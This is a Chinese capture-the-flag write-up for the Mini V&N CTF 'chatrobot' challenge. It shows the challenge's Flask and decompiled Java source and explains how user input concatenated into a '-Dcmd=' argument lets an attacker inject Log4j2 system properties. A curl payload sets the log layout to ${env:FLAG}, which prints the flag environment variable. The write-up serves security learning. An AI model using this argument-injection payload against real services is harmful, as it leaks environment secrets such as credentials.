# Mini V&N CTF【chatrobot】复现
给了源码，主要文件有两个：
1. `target/chatrobot-1.0-SNAPSHOT.jar!\com\ctf\chatrobot\App.class`
2. `src/app.py`
```python
# app.py
import os
import subprocess
from flask import request, render_template, Flask
import os
import subprocess
from flask import request, render_template, Flask

app = Flask(__name__)


JAVA_JAR_PATH = 'target/chatrobot-1.0-SNAPSHOT.jar'

@app.route("/", methods=['GET', 'POST'])
def start():
    if request.method == 'POST':
        text_input = request.form.get('text', '').strip()
        if not text_input:
             return ('invalid message', 400)
        
        parts = text_input.split(' ', 1)
        cmd = parts[0]
        text = parts[1] if len(parts) > 1 else ''
        
        result = chat(cmd, text)
        return result.get('stdout', '') + result.get('stderr', '')
        
    return render_template('index.html')

@app.route("/chat", methods=['GET'])
def handle_chat_api():
    cmd = request.args.get('cmd', '').strip()
    arg = request.args.get('arg', '').strip()
    
    if not cmd:
        return ('invalid command', 400)

    result = chat(cmd, arg)
    
    out = result.get('stdout', '').strip()
    err = result.get('stderr', '').strip()

    return out 


def chat(cmd, text):
    env = os.environ.copy()
    env['FLAG'] = env['INSERT_FLAG']
    java_command = [
        'java',
        '-Xms48M',
        '-Xmx96M',
        f'-Dcmd={cmd}', 
        '-jar',
        JAVA_JAR_PATH, 
        text
    ]

    try:
        res = subprocess.run(
            java_command, 
            capture_output=True, 
            timeout=45,
            env=env, 
            check=False 
        )


        stdout_text = res.stdout.decode('utf8', errors='replace')
        stderr_text = res.stderr.decode('utf8', errors='replace')

        return {
            'stdout': stdout_text,
            'stderr': stderr_text,
        }
    except subprocess.TimeoutExpired:
        return {
            'stdout': '喵呜！机器人跑太慢了，超时了啦 QAQ',
            'stderr': ''
        }
    except FileNotFoundError:
        return {
            'stdout': '喵？Java 或 JAR 文件找不到喵。',
            'stderr': ''
        }

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
```

```java
# App.class
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctf.chatrobot;

import java.time.LocalDateTime;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    public static Logger LOGGER = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        String flag = System.getenv("FLAG");
        if (flag == null) {
            LOGGER.error("{}", "欸？flag去哪了喵(。_。)");
        }

        LOGGER.info("msg: {}", args);
        String cmd = System.getProperty("cmd");
        if (cmd != null && !cmd.equals("help")) {
            if (!cmd.startsWith("/")) {
                System.out.println("都说了用/开头了啊喂，你这个大笨蛋喵(╯▔皿▔)╯");
            } else {
                doCommand(cmd.substring(1), args);
            }
        } else {
            doHelp();
        }
    }

    private static void doCommand(String cmd, String[] arg) {
        String argText = arg.length > 0 ? arg[0] : "";
        switch (cmd) {
            case "help":
                doHelp();
                break;
            case "spawnpoint":
                if (argText.isEmpty()) {
                    System.out.println("喵？你想把重生点定在哪儿？格式：/spawnpoint <坐标/地点>");
                } else {
                    System.out.println("重生点已设定在: " + argText);
                }
                break;
            case "time":
                System.out.println(LocalDateTime.now().toString());
                break;
            case "weather":
                if (argText.trim().isEmpty()) {
                    String effect = "";
                    String response = "今天天气不错喵";
                } else {
                    String response;
                    String effect;
                    switch (argText.trim().toLowerCase()) {
                        case "sun":
                            effect = "[WEATHER_SUN]";
                            response = "今天天气不错喵";
                            break;
                        case "rain":
                            effect = "[WEATHER_RAIN]";
                            response = "听说下雨和巧克力更配喵";
                            break;
                        case "snow":
                            effect = "[WEATHER_SNOW]";
                            response = "又到了白色相簿的季节喵";
                            break;
                        default:
                            effect = "";
                            response = "喵？这个天气我不认识！试试 rain/snow/sun 喵";
                    }

                    System.out.println(effect + " " + response);
                }
                break;
            default:
                System.out.println("都说了好感度不够了啦╮(￣⊿￣)╭");
        }

    }

    private static void doHelp() {
        System.out.println("目前好感度不够喵，只能设置重生点（/spawnpoint），查看时间（/time），设置天气（/weather rain/snow/sun）");
    }
}
```
审计源码后我们知道了大致的业务流程：
1. python的路由接受用户的输入后进行一些拆分处理为参数
2. 调用chat()方法把用户的输入拼接到了java程序的编译命令参数中
3. 由java处理后端逻辑
chat()方法关键部分：
```python
def chat(cmd, text):
    env = os.environ.copy()
    env['FLAG'] = env['INSERT_FLAG']
    java_command = [
        'java',
        '-Xms48M',
        '-Xmx96M',
        f'-Dcmd={cmd}', 
        '-jar',
        JAVA_JAR_PATH, 
        text
    ]

    try:
        res = subprocess.run(
            java_command, 
            capture_output=True, 
            timeout=45,
            env=env, 
            check=False 
        )

```
`f'-Dcmd={cmd}'`把用户输入直接拼接到了参数中。
所以这里我们就可以去注入参数了
比如我们构造
```bash
'-Dcmd = /weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=${env:FLAG}'
#此时jvm解析后就是
java_command = [
    'java',
    '-Xms48M',
    '-Xmx96M',
    '-Dcmd=/weather',
    '-Dlog4j2.formatMsgNoLookups=false',
    '-Dlog4j2.layout.pattern=${env:FLAG}',
    '-jar',
    JAVA_JAR_PATH,
    text
]

```
后面的就被当作参数注入了
然后解释一下这两个参数：

首先`-D`开头的是`JVM系统参数
然后这两条都是属于`jog4j2`的专属系统参数

* ==-Dlog4j2.formatMsgNoLookups=false==
1. 这条参数是控制 **Log4j2 是否对日志消息中的 `${}` 做 Lookup 解析**。
2. 在`Log4j2 2.15+`的版本中这个值默认是`ture`表示不会解析该语法
3. 现在我们显示开启解析

* ==-Dlog4j2.layout.pattern=${env:FLAG}==
1. 这条参数是直接指定 Log4j2 使用的 **PatternLayout 模板**。
2. `${env:FLAG}`就是lookup语法，表示输出环境变量中的flag

这里为什么会输出日志，是因为后端java代码中有
```java
    LOGGER.info("msg: {}", args);
```
这句就是打印一次日志信息，原本是要打印`("msg: {}", args)`,但是由于我们注入的第二个参数
日志格式被替换了，所以可以输出flag。

所以最后payload：
```bash
curl -X POST  http://challenge.ilovectf.cn:30285/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} sun"
```
